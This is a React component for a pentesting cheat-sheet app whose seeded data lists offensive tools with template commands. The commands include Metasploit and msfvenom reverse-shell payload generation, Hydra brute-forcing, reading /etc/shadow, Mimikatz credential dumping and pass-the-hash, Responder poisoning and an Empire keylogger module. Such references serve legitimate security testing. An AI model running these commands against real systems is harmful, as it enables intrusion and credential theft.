import { useState, useMemo } from 'react'
import {
  Box,
  Heading,
  VStack,
  Button,
  useDisclosure,
  Modal,
  ModalOverlay,
  ModalContent,
  ModalHeader,
  ModalBody,
  Input,
  Textarea,
  SimpleGrid,
  Text,
  HStack,
  Select,
  InputGroup,
  InputLeftElement
} from '@chakra-ui/react'
import { FiTerminal, FiPlus, FiSearch } from 'react-icons/fi'

interface Tool {
  id: number
  name: string
  description: string
  commands: string
  category?: string
}

const initialTools: Tool[] = [
  {
    id: 1,
    name: 'Nmap',
    description: 'Network mapper and port scanner',
    commands: 'nmap -sV -sC [target]\nnmap -p- [target]\nnmap --script vuln [target]\nnmap -sS -sV -O [target] # OS detection\nnmap --script http-enum [target] # Web enumeration',
    category: 'Reconnaissance'
  },
  {
    id: 2,
    name: 'Metasploit',
    description: 'Penetration testing framework',
    commands: 'msfconsole\nuse exploit/[path]\nset RHOSTS [target]\nset LHOST [your-ip]\nshow options\nrun/exploit\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=[your-ip] LPORT=4444 -f exe > shell.exe',
    category: 'Exploitation'
  },
  {
    id: 3,
    name: 'Wireshark',
    description: 'Network protocol analyzer',
    commands: 'wireshark\ntshark -i [interface]\ntshark -r [file.pcap]\ntshark -i [interface] -w capture.pcap\ntshark -r input.pcap -Y "http.request.method == GET"',
    category: 'Network Analysis'
  },
  {
    id: 4,
    name: 'Burp Suite',
    description: 'Web application security testing platform',
    commands: 'java -jar burpsuite.jar\nproxy port: 8080\nfoxproxy settings: 127.0.0.1:8080\nscope settings: target.com\nintruder patterns: §payload§',
    category: 'Web Security'
  },
  {
    id: 5,
    name: 'Hydra',
    description: 'Password cracking and brute-force tool',
    commands: 'hydra -l user -P wordlist.txt [target] ssh\nhydra -L users.txt -P passwords.txt [target] ftp\nhydra -l admin -P /usr/share/wordlists/rockyou.txt [target] http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"',
    category: 'Password Attacks'
  },
  {
    id: 6,
    name: 'John the Ripper',
    description: 'Password cracker',
    commands: 'john hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\njohn --format=sha512crypt hash.txt\nunshadow /etc/passwd /etc/shadow > mypasswd.txt\njohn mypasswd.txt',
    category: 'Password Attacks'
  },
  {
    id: 7,
    name: 'Hashcat',
    description: 'Advanced password recovery',
    commands: 'hashcat -m 0 -a 0 hash.txt wordlist.txt\nhashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 1800 -a 0 hash.txt wordlist.txt # For SHA512crypt\nhashcat -m 3200 hash.txt -a 3 ?a?a?a?a?a?a # Brute force',
    category: 'Password Attacks'
  },
  {
    id: 8,
    name: 'Gobuster',
    description: 'Directory/File & DNS busting tool',
    commands: 'gobuster dir -u http://[target] -w /usr/share/wordlists/dirb/common.txt\ngobuster vhost -u http://[target] -w subdomains.txt\ngobuster dns -d [domain] -w subdomains.txt\ngobuster dir -u http://[target] -w wordlist.txt -x php,txt,html',
    category: 'Web Security'
  },
  {
    id: 9,
    name: 'SQLMap',
    description: 'Automatic SQL injection tool',
    commands: 'sqlmap -u "http://[target]" --dbs\nsqlmap -u "http://[target]" -D dbname --tables\nsqlmap -u "http://[target]" -D dbname -T tablename --dump\nsqlmap -r request.txt --risk=3 --level=5\nsqlmap --url="http://[target]" --data="id=1" --batch --dbms=mysql',
    category: 'Web Security'
  },
  {
    id: 10,
    name: 'Aircrack-ng',
    description: 'Wireless network security testing',
    commands: 'airmon-ng start wlan0\nairodump-ng wlan0mon\nairodump-ng -c [channel] --bssid [MAC] -w capture wlan0mon\naireplay-ng -0 2 -a [MAC] -c [client-MAC] wlan0mon\naircrack-ng -w wordlist.txt capture-01.cap',
    category: 'Wireless'
  },
  {
    id: 11,
    name: 'Nikto',
    description: 'Web server scanner',
    commands: 'nikto -h [target]\nnikto -h [target] -ssl # HTTPS\nnikto -h [target] -port 443,8080,8443\nnikto -h [target] -Tuning 123 # Specific tests\nnikto -h [target] -output report.html -Format htm',
    category: 'Web Security'
  },
  {
    id: 12,
    name: 'Dirb',
    description: 'Web content scanner',
    commands: 'dirb http://[target]\ndirb https://[target] /usr/share/dirb/wordlists/common.txt\ndirb http://[target] -X .php,.txt,.html\ndirb http://[target] -u admin:password\ndirb http://[target] -r # Non-recursive',
    category: 'Web Security'
  },
  {
    id: 13,
    name: 'Responder',
    description: 'LLMNR, NBT-NS and MDNS poisoner',
    commands: 'responder -I eth0 -wrfv\nresponder -I eth0 -wrfv -b -F\nresponder-RunFinger -i [target]\nresponder -I eth0 -wrfv -P -F # SMB Proxy Auth',
    category: 'Network Attacks'
  },
  {
    id: 14,
    name: 'Empire',
    description: 'Post-exploitation framework',
    commands: './empire\nusestager windows/launcher_bat\nset Listener http\ngenerate\nusemodule situational_awareness/network/powerview/get_user\nusemodule collection/keylogger\nexecute',
    category: 'Post Exploitation'
  },
  {
    id: 15,
    name: 'Mimikatz',
    description: 'Windows credential dumping',
    commands: 'privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\nlsadump::secrets\nkerberos::list /export\nsekurlsa::pth /user:admin /domain:domain.local /ntlm:[hash]',
    category: 'Post Exploitation'
  }
]

export function Tools() {
  const [tools, setTools] = useState<Tool[]>(initialTools)
  const { isOpen, onOpen, onClose } = useDisclosure()
  const [newTool, setNewTool] = useState<Partial<Tool>>({})
  const [searchQuery, setSearchQuery] = useState('')
  const [selectedCategory, setSelectedCategory] = useState('All')

  const categories = useMemo(() => {
    const cats = ['All', ...new Set(tools.map(tool => tool.category || 'Uncategorized'))]
    return cats.sort()
  }, [tools])

  const filteredTools = useMemo(() => {
    return tools.filter(tool => {
      const matchesSearch = 
        tool.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        tool.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
        tool.commands.toLowerCase().includes(searchQuery.toLowerCase())
      
      const matchesCategory = 
        selectedCategory === 'All' || 
        tool.category === selectedCategory

      return matchesSearch && matchesCategory
    })
  }, [tools, searchQuery, selectedCategory])

  const addTool = () => {
    if (newTool.name && newTool.description && newTool.commands) {
      setTools([...tools, { ...newTool, id: Date.now() } as Tool])
      onClose()
      setNewTool({})
    }
  }

  return (
    <Box maxW="1200px" mx="auto" p={4}>
      <Box mb={8} borderBottom="2px" borderColor="green.400" pb={4}>
        <Heading size="2xl" color="green.400" fontFamily="mono">
          toolDb {'>'} _
        </Heading>
        <Text color="whiteAlpha.700" mt={2}>
          Your Pentesting Command Arsenal
        </Text>
      </Box>

      <HStack spacing={4} mb={6}>
        <InputGroup maxW="400px">
          <InputLeftElement color="green.400">
            <FiSearch />
          </InputLeftElement>
          <Input
            placeholder="Search tools, descriptions, or commands..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            borderColor="green.400"
            _hover={{ borderColor: 'green.300' }}
            _focus={{ borderColor: 'green.200' }}
          />
        </InputGroup>
        
        <Select
          value={selectedCategory}
          onChange={(e) => setSelectedCategory(e.target.value)}
          maxW="200px"
          borderColor="green.400"
          _hover={{ borderColor: 'green.300' }}
          _focus={{ borderColor: 'green.200' }}
        >
          {categories.map(category => (
            <option key={category} value={category} style={{ background: '#1A202C' }}>
              {category}
            </option>
          ))}
        </Select>

        <Button 
          onClick={onOpen}
          bg="green.400"
          color="black"
          _hover={{ bg: 'green.300' }}
          fontFamily="mono"
          leftIcon={<FiPlus />}
        >
          Add New Tool
        </Button>
      </HStack>

      {filteredTools.length === 0 ? (
        <Box 
          textAlign="center" 
          p={8} 
          border="1px" 
          borderColor="green.400" 
          borderRadius="md"
          color="whiteAlpha.700"
        >
          No tools found matching your search criteria
        </Box>
      ) : (
        <SimpleGrid columns={{ base: 1, md: 2, lg: 3 }} spacing={6}>
          {filteredTools.map(tool => (
            <Box 
              key={tool.id}
              p={5}
              border="1px"
              borderColor="green.400"
              borderRadius="md"
              bg="whiteAlpha.50"
              _hover={{ 
                transform: 'scale(1.02)',
                boxShadow: '0 0 10px #00ff00'
              }}
              transition="all 0.2s"
              position="relative"
              overflow="hidden"
            >
              <Box 
                position="absolute" 
                top={0} 
                right={0} 
                bg="green.400" 
                color="black" 
                px={2} 
                py={1}
                borderBottomLeftRadius="md"
                fontSize="xs"
                fontFamily="mono"
              >
                {tool.category || 'Uncategorized'}
              </Box>
              
              <Heading size="md" mb={2} color="green.400" fontFamily="mono">
                <Box as={FiTerminal} display="inline-block" mr={2} />
                {tool.name}
              </Heading>
              
              <Text color="whiteAlpha.800" mb={3} fontSize="sm">
                {tool.description}
              </Text>
              
              <Box
                p={3}
                bg="blackAlpha.500"
                borderRadius="md"
                fontFamily="mono"
                fontSize="sm"
                whiteSpace="pre-wrap"
                maxH="200px"
                overflowY="auto"
                css={{
                  '&::-webkit-scrollbar': {
                    width: '4px',
                  },
                  '&::-webkit-scrollbar-track': {
                    background: 'transparent',
                  },
                  '&::-webkit-scrollbar-thumb': {
                    background: '#48BB78',
                    borderRadius: '4px',
                  },
                }}
              >
                {tool.commands}
              </Box>
            </Box>
          ))}
        </SimpleGrid>
      )}

      <Modal isOpen={isOpen} onClose={onClose} isCentered>
        <ModalOverlay backdropFilter="blur(3px)" />
        <ModalContent bg="gray.900">
          <ModalHeader color="green.400" fontFamily="mono">Add New Tool</ModalHeader>
          <ModalBody pb={6}>
            <VStack spacing={4}>
              <Input
                placeholder="Tool name"
                value={newTool.name || ''}
                onChange={(e) => setNewTool({...newTool, name: e.target.value})}
                borderColor="green.400"
                _hover={{ borderColor: 'green.300' }}
                _focus={{ borderColor: 'green.200' }}
              />
              <Input
                placeholder="Category (optional)"
                value={newTool.category || ''}
                onChange={(e) => setNewTool({...newTool, category: e.target.value})}
                borderColor="green.400"
                _hover={{ borderColor: 'green.300' }}
                _focus={{ borderColor: 'green.200' }}
              />
              <Textarea
                placeholder="Description"
                value={newTool.description || ''}
                onChange={(e) => setNewTool({...newTool, description: e.target.value})}
                borderColor="green.400"
                _hover={{ borderColor: 'green.300' }}
                _focus={{ borderColor: 'green.200' }}
              />
              <Textarea
                placeholder="Commands (one per line)"
                value={newTool.commands || ''}
                onChange={(e) => setNewTool({...newTool, commands: e.target.value})}
                borderColor="green.400"
                _hover={{ borderColor: 'green.300' }}
                _focus={{ borderColor: 'green.200' }}
                height="150px"
              />
              <Button 
                onClick={addTool} 
                width="full"
                bg="green.400"
                color="black"
                _hover={{ bg: 'green.300' }}
                fontFamily="mono"
              >
                Add Tool
              </Button>
            </VStack>
          </ModalBody>
        </ModalContent>
      </Modal>
    </Box>
  )
}